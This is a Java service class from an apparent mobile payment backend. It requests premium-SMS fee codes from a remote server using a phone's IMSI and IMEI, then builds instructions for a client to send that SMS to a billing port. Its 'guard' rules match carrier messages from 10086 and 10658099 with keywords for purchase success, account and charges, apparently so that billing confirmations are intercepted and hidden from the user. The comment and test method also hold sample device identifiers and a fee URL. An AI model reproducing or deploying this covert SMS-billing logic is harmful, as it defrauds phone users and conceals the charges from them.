package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sets;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.PostData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.appclient.utils.StringUtils;

/**
 * 动漫
 * http://tianchili.xn--fiqs8scxj63l.com/SMSInterface/root/fee.do?partnerid=80632791&appid=1&channelid=1&money=400&operator=1&area=15&imsi=460011537054480&imei=352260052616749&code=TCL24
{"returncode":"0","orderid":"3142613","moport":"1065843109","mocode":"MFccfa1cc0c20169a95cdf7347208b76f53dade0a074cab4d96477c186e9dedffd6682dd66d5c7d354c9ede79df0a24f67"}

 * 
 * @author leoliu
 *
 */
public class HhkjDmDynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(HhkjDmDynamicService.class);
	
	private static final String TYPE = "hhkjDm";
	
	private static final String PARAM1 = "partnerid={partnerid}&appid={appid}&channelid={channelid}&money={money}&operator=1&area=15&imsi={imsi}&imei={imei}&code={code}";
	
	private int timeOut = 60;
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final Guard guard1 = new Guard("10658099","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658099","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = StringUtils.defaultString(map.get("imsi"));
			String imei = StringUtils.defaultString(map.get("imei"));
			String partnerid = map.get("partnerid");
			String appid = map.get("appid");
			String channelid = map.get("channelid");
			String money = map.get("money");
			String code = map.get("code");
			
			String param = PARAM1.replace("{partnerid}",partnerid).replace("{appid}",appid).replace("{channelid}",channelid).replace("{money}",money).replace("{imsi}",imsi).replace("{imei}",imei).replace("{code}",code);
			
			String responseJson = GetData.getData(url,param);
			
			xml = parseJson(map,responseJson);
			
			if(xml != null && xml.length() > 0){
				tryMap.remove(channel);
			}else{
				return DynamicUtils.parseWait(10,map);
			}
		}
		
		return xml;
	}

	private String parseJson(Map<String, String> map,String responseJson){
		
		if(responseJson != null && responseJson.length() > 0){
			try{
				JSONObject jo = new JSONObject(responseJson); 
				
				String status = jo.getString("returncode");
				
				if("0".equals(status)){
					String cmd = jo.getString("mocode");
					String port = jo.getString("moport");
					
					Sms sms = new Sms();
					
					sms.setSmsContent(cmd);
					sms.setSmsDest(port);
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					List<Sms> smsList = new ArrayList<Sms>();
					
					smsList.add(sms);
					
					Sms guardSms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard1);
					guardList.add(guard2);
					guardList.add(guard3);
					guardList.add(guard4);
					
					guardSms.setGuardList(guardList);
					
					smsList.add(0, guardSms);
						
					return XstreamHelper.toXml(smsList);
				}
			}catch(Exception e){
				e.printStackTrace();
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
		
		test1();
	}
	
	private static void test1(){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://tianchili.xn--fiqs8scxj63l.com/SMSInterface/root/fee.do");
		map.put("channel", "106208a001001001");
		map.put("imei","862949029214504");
		map.put("imsi", "460022101441340");
		map.put("type", "hhkjDm");
		map.put("partnerid","5963142");
		map.put("appid","17");
		map.put("channelid","91933");
		map.put("money","800");
		map.put("code","TCL24");
		
		String xml = new HhkjDmDynamicService().dynamic(map);
		
		logger.info(xml);
	}
	
}
